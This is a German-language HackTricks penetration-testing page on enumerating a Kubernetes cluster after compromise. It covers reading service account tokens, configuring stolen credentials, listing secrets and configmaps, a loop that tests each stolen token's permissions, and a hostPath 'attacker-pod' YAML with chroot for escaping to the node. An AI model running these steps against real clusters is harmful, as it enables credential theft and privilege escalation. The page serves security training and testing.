# Kubernetes Enumeration

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

## Kubernetes Tokens

Wenn du kompromittierten Zugriff auf eine Maschine hast, k√∂nnte der Benutzer Zugriff auf eine Kubernetes-Plattform haben. Das Token befindet sich normalerweise in einer Datei, die durch die **Umgebungsvariable `KUBECONFIG`** oder **innerhalb von `~/.kube`** angegeben wird.

In diesem Ordner findest du m√∂glicherweise Konfigurationsdateien mit **Tokens und Konfigurationen zur Verbindung mit dem API-Server**. In diesem Ordner kannst du auch einen Cache-Ordner mit zuvor abgerufenen Informationen finden.

Wenn du einen Pod in einer Kubernetes-Umgebung kompromittiert hast, gibt es andere Orte, an denen du Tokens und Informationen √ºber die aktuelle K8-Umgebung finden kannst:

### Service Account Tokens

Bevor du fortf√§hrst, wenn du nicht wei√üt, was ein Service in Kubernetes ist, empfehle ich dir, **diesem Link zu folgen und mindestens die Informationen √ºber die Kubernetes-Architektur zu lesen.**

Entnommen aus der Kubernetes [Dokumentation](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server):

_‚ÄûWenn du einen Pod erstellst und kein Service-Konto angibst, wird ihm automatisch das_ Standard-_Service-Konto im selben Namespace zugewiesen.‚Äù_

**ServiceAccount** ist ein von Kubernetes verwaltetes Objekt, das verwendet wird, um eine Identit√§t f√ºr Prozesse bereitzustellen, die in einem Pod ausgef√ºhrt werden.\
Jedes Service-Konto hat ein zugeh√∂riges Geheimnis, und dieses Geheimnis enth√§lt ein Tr√§ger-Token. Dies ist ein JSON Web Token (JWT), ein Verfahren zur sicheren Darstellung von Anspr√ºchen zwischen zwei Parteien.

In der Regel enth√§lt **einer** der Verzeichnisse:

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

die Dateien:

* **ca.crt**: Es ist das CA-Zertifikat zur √úberpr√ºfung der Kubernetes-Kommunikation
* **namespace**: Es gibt den aktuellen Namespace an
* **token**: Es enth√§lt das **Service-Token** des aktuellen Pods.

Jetzt, da du das Token hast, kannst du den API-Server in der Umgebungsvariable **`KUBECONFIG`** finden. F√ºr weitere Informationen f√ºhre `(env | set) | grep -i "kuber|kube`**`"`**

Das Service-Konto-Token wird mit dem Schl√ºssel signiert, der sich in der Datei **sa.key** befindet, und durch **sa.pub** validiert.

Standardstandort auf **Kubernetes**:

* /etc/kubernetes/pki

Standardstandort auf **Minikube**:

* /var/lib/localkube/certs

### Hot Pods

_**Hot Pods sind**_ Pods, die ein privilegiertes Service-Konto-Token enthalten. Ein privilegiertes Service-Konto-Token ist ein Token, das die Berechtigung hat, privilegierte Aufgaben wie das Auflisten von Geheimnissen, das Erstellen von Pods usw. auszuf√ºhren.

## RBAC

Wenn du nicht wei√üt, was **RBAC** ist, **lies diesen Abschnitt**.

## GUI-Anwendungen

* **k9s**: Eine GUI, die einen Kubernetes-Cluster vom Terminal aus auflistet. √úberpr√ºfe die Befehle in [https://k9scli.io/topics/commands/](https://k9scli.io/topics/commands/). Schreibe `:namespace` und w√§hle alle aus, um dann Ressourcen in allen Namespaces zu suchen.
* **k8slens**: Bietet einige kostenlose Testtage an: [https://k8slens.dev/](https://k8slens.dev/)

## Enumeration CheatSheet

Um eine K8s-Umgebung zu enumerieren, ben√∂tigst du ein paar Dinge:

* Ein **g√ºltiges Authentifizierungstoken**. Im vorherigen Abschnitt haben wir gesehen, wo man nach einem Benutzertoken und einem Service-Konto-Token suchen kann.
* Die **Adresse (**_**https://host:port**_**) des Kubernetes API**. Dies kann normalerweise in den Umgebungsvariablen und/oder in der Kube-Konfigurationsdatei gefunden werden.
* **Optional**: Das **ca.crt zur √úberpr√ºfung des API-Servers**. Dies kann an denselben Orten gefunden werden, an denen das Token gefunden werden kann. Dies ist n√ºtzlich, um das Zertifikat des API-Servers zu √ºberpr√ºfen, aber wenn du `--insecure-skip-tls-verify` mit `kubectl` oder `-k` mit `curl` verwendest, ben√∂tigst du dies nicht.

Mit diesen Details kannst du **Kubernetes enumerieren**. Wenn die **API** aus irgendeinem Grund √ºber das **Internet** **zug√§nglich** ist, kannst du diese Informationen einfach herunterladen und die Plattform von deinem Host aus enumerieren.

In der Regel befindet sich der **API-Server jedoch in einem internen Netzwerk**, daher musst du einen **Tunnel** durch die kompromittierte Maschine erstellen, um von deiner Maschine darauf zuzugreifen, oder du kannst die [**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux) Bin√§rdatei hochladen oder **`curl/wget/anything`** verwenden, um rohe HTTP-Anfragen an den API-Server zu senden.

### Unterschiede zwischen den Verben `list` und `get`

Mit **`get`** Berechtigungen kannst du Informationen √ºber spezifische Assets (_`describe` Option in `kubectl`_) API:
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
Wenn Sie die **`list`** Berechtigung haben, d√ºrfen Sie API-Anfragen ausf√ºhren, um eine Art von Asset aufzulisten (_`get` Option in `kubectl`_):
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
Wenn Sie die **`watch`**-Berechtigung haben, d√ºrfen Sie API-Anfragen ausf√ºhren, um Ressourcen zu √ºberwachen:
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
Sie √∂ffnen eine Streaming-Verbindung, die Ihnen das vollst√§ndige Manifest eines Deployments zur√ºckgibt, wann immer es sich √§ndert (oder wenn ein neues erstellt wird).

{% hint style="danger" %}
Die folgenden `kubectl`-Befehle zeigen, wie man die Objekte auflistet. Wenn Sie auf die Daten zugreifen m√∂chten, m√ºssen Sie `describe` anstelle von `get` verwenden.
{% endhint %}

### Verwendung von curl

Von innerhalb eines Pods k√∂nnen Sie mehrere Umgebungsvariablen verwenden:
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
{% hint style="warning" %}
Standardm√§√üig kann das Pod **auf** den **kube-api-Server** im Domainnamen **`kubernetes.default.svc`** zugreifen, und Sie k√∂nnen das kube-Netzwerk in **`/etc/resolv.config`** sehen, da Sie hier die Adresse des Kubernetes-DNS-Servers finden (die ".1" desselben Bereichs ist der kube-api-Endpunkt).
{% endhint %}

### Verwendung von kubectl

Mit dem Token und der Adresse des API-Servers verwenden Sie kubectl oder curl, um darauf zuzugreifen, wie hier angegeben:

Standardm√§√üig kommuniziert der APISERVER mit dem `https://`-Schema

{% code overflow="wrap" %}
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true [--all-namespaces]' # Use --all-namespaces to always search in all namespaces
```
{% endcode %}

> Wenn kein `https://` in der URL vorhanden ist, kann es zu einem Fehler wie Bad Request kommen.

Sie k√∂nnen ein [**offizielles kubectl-Spickzettel hier**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/) finden. Das Ziel der folgenden Abschnitte ist es, in geordneter Weise verschiedene Optionen zur Enumeration und zum Verst√§ndnis des neuen K8s, auf das Sie Zugriff erhalten haben, zu pr√§sentieren.

Um die HTTP-Anfrage zu finden, die `kubectl` sendet, k√∂nnen Sie den Parameter `-v=8` verwenden.

#### MitM kubectl - Proxyfying kubectl
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### Aktuelle Konfiguration

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

Wenn es Ihnen gelungen ist, einige Benutzeranmeldeinformationen zu stehlen, k√∂nnen Sie **sie lokal konfigurieren** mit etwas wie:
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### Unterst√ºtzte Ressourcen abrufen

Mit diesen Informationen wissen Sie, welche Dienste Sie auflisten k√∂nnen

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
{% endtab %}
{% endtabs %}

### Aktuelle Berechtigungen abrufen

{% tabs %}
{% tab title="kubectl" %}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

Eine weitere M√∂glichkeit, Ihre Berechtigungen zu √ºberpr√ºfen, ist die Verwendung des Tools: [**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)\*\*\*\*

Sie k√∂nnen mehr √ºber **Kubernetes RBAC** erfahren in:

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**Sobald Sie wissen, welche Berechtigungen** Sie haben, √ºberpr√ºfen Sie die folgende Seite, um herauszufinden, **ob Sie diese ausnutzen k√∂nnen**, um Berechtigungen zu eskalieren:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Andere Rollen abrufen

{% tabs %}
{% tab title="kubectl" %}
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
{% endtab %}
{% endtabs %}

### Holen Sie sich Namespaces

Kubernetes unterst√ºtzt **mehrere virtuelle Cluster**, die von demselben physischen Cluster unterst√ºtzt werden. Diese virtuellen Cluster werden **Namespaces** genannt.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
{% endtab %}
{% endtabs %}

### Geheimnisse abrufen

{% tabs %}
{% tab title="kubectl" %}
```bash
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

Wenn Sie Geheimnisse lesen k√∂nnen, k√∂nnen Sie die folgenden Zeilen verwenden, um die Berechtigungen zu erhalten, die mit jedem Token verbunden sind:
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### Servicekonten abrufen

Wie zu Beginn dieser Seite besprochen **wird einem Pod normalerweise ein Servicekonto zugewiesen**. Daher kann das Auflisten der Servicekonten, ihrer Berechtigungen und wo sie ausgef√ºhrt werden, einem Benutzer erm√∂glichen, Privilegien zu eskalieren.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
{% endtab %}
{% endtabs %}

### Get Deployments

Die Deployments geben die **Komponenten** an, die **ausgef√ºhrt** werden m√ºssen.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
{% endtab %}
{% endtabs %}

### Pods abrufen

Die Pods sind die eigentlichen **Container**, die **ausgef√ºhrt** werden.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
{% endtab %}
{% endtabs %}

### Dienste abrufen

Kubernetes **Dienste** werden verwendet, um **einen Dienst an einem bestimmten Port und einer bestimmten IP** bereitzustellen (der als Lastenausgleich f√ºr die Pods fungiert, die tats√§chlich den Dienst anbieten). Es ist interessant zu wissen, wo Sie andere Dienste finden k√∂nnen, um zu versuchen, anzugreifen.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
{% endtab %}
{% endtabs %}

### Knoten abrufen

Holen Sie sich alle **Knoten, die im Cluster konfiguriert sind**.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get nodes
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
{% endtab %}
{% endtabs %}

### DaemonSets abrufen

**DaemonSets** erm√∂glichen es, sicherzustellen, dass ein **spezifischer Pod auf allen Knoten** des Clusters (oder auf den ausgew√§hlten) l√§uft. Wenn Sie den DaemonSet l√∂schen, werden auch die von ihm verwalteten Pods entfernt.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get daemonsets
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
{% endtab %}
{% endtabs %}

### Cronjob abrufen

Cronjobs erm√∂glichen es, mit einer crontab-√§hnlichen Syntax den Start eines Pods zu planen, der eine bestimmte Aktion ausf√ºhrt.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get cronjobs
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
{% endtab %}
{% endtabs %}

### Konfigurationsmappe abrufen

configMap enth√§lt immer viele Informationen und Konfigurationsdateien, die an Apps bereitgestellt werden, die in Kubernetes ausgef√ºhrt werden. Normalerweise finden Sie viele Passw√∂rter, Geheimnisse und Tokens, die zum Verbinden und Validieren mit anderen internen/externen Diensten verwendet werden.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
{% endtab %}
{% endtabs %}

### Netzwerkrichtlinien abrufen / Cilium Netzwerkrichtlinien

{% tabs %}
{% tab title="Erster Tab" %}
```bash
k get networkpolicies
k get CiliumNetworkPolicies
k get CiliumClusterwideNetworkPolicies
```
{% endtab %}
{% endtabs %}

### Alles / Alle

{% tabs %}
{% tab title="kubectl" %}
```bash
k get all
```
{% endtab %}
{% endtabs %}

### **Alle von Helm verwalteten Ressourcen abrufen**

{% tabs %}
{% tab title="kubectl" %}
```bash
k get all --all-namespaces -l='app.kubernetes.io/managed-by=Helm'
```
{% endtab %}
{% endtabs %}

### **Pod-Verbrauch abrufen**

{% tabs %}
{% tab title="kubectl" %}
```bash
k top pod --all-namespaces
```
{% endtab %}
{% endtabs %}

### Ausbrechen aus dem Pod

Wenn Sie in der Lage sind, neue Pods zu erstellen, k√∂nnten Sie in der Lage sein, aus ihnen auf den Knoten zu entkommen. Um dies zu tun, m√ºssen Sie einen neuen Pod mit einer YAML-Datei erstellen, zum erstellten Pod wechseln und dann in das System des Knotens chrooten. Sie k√∂nnen bereits vorhandene Pods als Referenz f√ºr die YAML-Datei verwenden, da sie vorhandene Images und Pfade anzeigen.
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> Wenn Sie ein Pod auf einem bestimmten Knoten erstellen m√ºssen, k√∂nnen Sie den folgenden Befehl verwenden, um die Labels auf dem Knoten abzurufen
>
> `k get nodes --show-labels`
>
> H√§ufig sind kubernetes.io/hostname und node-role.kubernetes.io/master gute Labels zur Auswahl.

Dann erstellen Sie Ihre attack.yaml-Datei.
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
[original yaml source](https://gist.github.com/abhisek/1909452a8ab9b8383a2e94f95ab0ccba)

Danach erstellen Sie das Pod
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
Jetzt k√∂nnen Sie zum erstellten Pod wie folgt wechseln
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
Und schlie√ülich chrootest du in das System des Knotens.
```bash
chroot /root /bin/bash
```
Information obtained from: [Kubernetes Namespace Breakout using Insecure Host Path Volume ‚Äî Part 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Attacking and Defending Kubernetes: Bust-A-Kube ‚Äì Episode 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## References

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}
